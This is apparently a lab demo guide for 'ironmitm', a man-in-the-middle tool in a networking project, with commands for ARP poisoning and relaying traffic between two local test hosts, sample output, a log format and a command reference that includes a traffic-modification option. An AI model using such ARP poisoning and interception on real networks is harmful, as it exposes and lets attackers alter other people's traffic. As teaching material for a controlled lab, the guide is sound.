# Demo 24: MITM Relay Engine (ironmitm) — Traffic Interception

## Prerequisites

- WSL 2 with Ubuntu
- IronNet built: `cd IronNet/build && cmake ../src -DCMAKE_BUILD_TYPE=Debug && make`
- Three terminal windows

## What this demo shows

- MITM attack intercepts all traffic between two hosts
- ARP poisoning redirects traffic through the attacker
- All intercepted packets are logged (direction, IPs, ports, protocol)

## Network Topology

```
Terminal 2 (Victim/Client)     Terminal 3 (Attacker/MITM)     Terminal 1 (Router/Server)
  10.0.1.2                       ironmitm                       10.0.1.1
     |                              |                              |
     +--- "10.0.1.1 is at          |                              |
     |     DE:AD:BE:EF:01" ←-------+------→ "10.0.1.2 is at      |
     |                              |         DE:AD:BE:EF:01" ----+
     |                              |                              |
     +--------→ traffic --------→ [sniff + log + forward] ------→ +
     +←-------- traffic ←-------- [sniff + log + forward] ←------ +
```

## Terminal 1: Start the router

```bash
cd IronNet/build
sudo ./ironstack/ironstack -d ../src/configs/router.conf
```

## Terminal 2: Setup client

```bash
sudo ip addr add 10.0.1.2/24 dev iron0
sudo ip link set iron0 up
```

## Terminal 3: Start MITM relay

```bash
cd IronNet/build
sudo ./ironattack/ironmitm --victim-a 10.0.1.1 --victim-b 10.0.1.2 --iface iron0 --log /tmp/mitm.log
```

Expected output:
```
╔══════════════════════════════════════════╗
║     ironmitm — MITM Relay Engine         ║
╚══════════════════════════════════════════╝

  Victim A: 10.0.1.1
  Victim B: 10.0.1.2
  Iface:    iron0
  Log:      /tmp/mitm.log

  [mitm] Starting ARP poisoning + relay...
  [mitm] Press Ctrl+C to stop.
```

## Terminal 2: Generate traffic

```bash
ping -c 3 10.0.1.1
echo "secret message" | nc -w2 10.0.1.1 7
```

## Terminal 3: MITM output (intercepted traffic)

```
  [A->B] 10.0.1.1:7 -> 10.0.1.2:49700 TCP (47 bytes)
  [A->B] 10.0.1.1:0 -> 10.0.1.2:0 OTHER (84 bytes)
  ...
```

## Terminal 3: Stop MITM (Ctrl+C)

```
^C
  [mitm] Stopped.
  [mitm] Intercepted: 24 packets
  [mitm] Forwarded:   24 packets
  [mitm] Log saved.
```

## View the log file

```bash
cat /tmp/mitm.log
```

Format: `direction|src_ip|src_port|dst_ip|dst_port|protocol|size`

## How it works

1. **ARP Poisoning** (every 2 seconds): tells both victims the other's IP is at attacker's MAC
2. **Packet Sniffing**: AF_PACKET socket in promiscuous mode
3. **Logging**: prints each packet with direction, IPs, ports, protocol, size
4. **Forwarding**: rewrites destination MAC and sends to real recipient

## Known Limitation: Single-TAP Forwarding Loop

On a single-TAP setup, forwarding creates an amplification loop (duplicate packets with decreasing TTL). This is an architectural limitation — in a real network or ironsim 3-node topology, forwarding works correctly.

## Command reference

```bash
sudo ./ironattack/ironmitm --victim-a <ip> --victim-b <ip> --iface <name> [--log <file>] [--modify <find:replace>]
```
